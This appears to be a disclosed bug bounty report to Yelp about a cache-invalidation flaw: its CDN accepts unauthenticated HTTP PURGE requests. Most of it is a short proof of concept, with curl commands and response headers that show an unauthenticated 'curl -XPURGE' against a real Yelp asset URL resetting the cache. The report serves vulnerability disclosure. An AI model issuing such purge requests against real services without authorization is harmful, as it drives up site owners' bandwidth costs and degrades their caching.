# PURGE is not authenticated

## Report Details
- **Report ID**: 629612
- **URL**: https://hackerone.com/reports/629612
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-06-26T01:29:34.709Z
- **Disclosed**: 2023-01-19T18:07:20.090Z

## Reporter
- **Username**: rac_fckscty
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: yelp

## Vulnerability Information
Hi @yelp Team,

Anyone can issue a PURGE request for any resource and invalidate your caches. That can lead to increased bandwidth costs.

Fetching the resource headers, we can see in the `X-Cache-Hits: 1, 14` :
```
E:\>curl https://s3-media0.fl.yelpcdn.com/assets/public/pride@2x.yelp_design_web.yji-629fce3629585b9db2137d9353196628.png --head
HTTP/1.1 200 OK
ETag: "629fce3629585b9db2137d9353196628"
x-amz-version-id: KnfcY6QenKubeC6DBXpUT1d87B17ORdD
Content-Type: image/png
Server: AmazonS3
Via: 1.1 varnish
Access-Control-Allow-Origin: *
Content-Length: 17079
Accept-Ranges: bytes
Date: Wed, 26 Jun 2019 01:22:10 GMT
Via: 1.1 varnish
Connection: keep-alive
X-Served-By: cache-sjc3141-SJC, cache-hkg17922-HKG
X-Cache: HIT, HIT
X-Cache-Hits: 1, 14
X-Timer: S1561512131.889727,VS0,VE0
Cache-Control: max-age=315360000, immutable
Timing-Allow-Origin: *
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Unauthenticated purge request:
```
E:\>curl https://s3-media0.fl.yelpcdn.com/assets/public/pride@2x.yelp_design_web.yji-629fce3629585b9db2137d9353196628.png --head -XPURGE
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 46
Accept-Ranges: bytes
Date: Wed, 26 Jun 2019 01:22:17 GMT
X-Varnish: 1668603163
Via: 1.1 varnish
Connection: keep-alive
X-Served-By: cache-hkg17923-HKG
```

Header `X-Cache-Hits: 1, 0`:
```
E:\>curl https://s3-media0.fl.yelpcdn.com/assets/public/pride@2x.yelp_design_web.yji-629fce3629585b9db2137d9353196628.png --head
HTTP/1.1 200 OK
ETag: "629fce3629585b9db2137d9353196628"
x-amz-version-id: 8qpzJuX00EuyeMTUm5QGEHehZ2rbfRmQ
Content-Type: image/png
Server: AmazonS3
Via: 1.1 varnish
Access-Control-Allow-Origin: *
Content-Length: 17079
Accept-Ranges: bytes
Date: Wed, 26 Jun 2019 01:22:20 GMT
Via: 1.1 varnish
Connection: keep-alive
X-Served-By: cache-sjc3129-SJC, cache-hkg17923-HKG
X-Cache: HIT, MISS
X-Cache-Hits: 1, 0
X-Timer: S1561512140.209567,VS0,VE151
Cache-Control: max-age=315360000, immutable
Timing-Allow-Origin: *
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

## Impact

That can lead to increased bandwidth costs.

## Attachments
No attachments
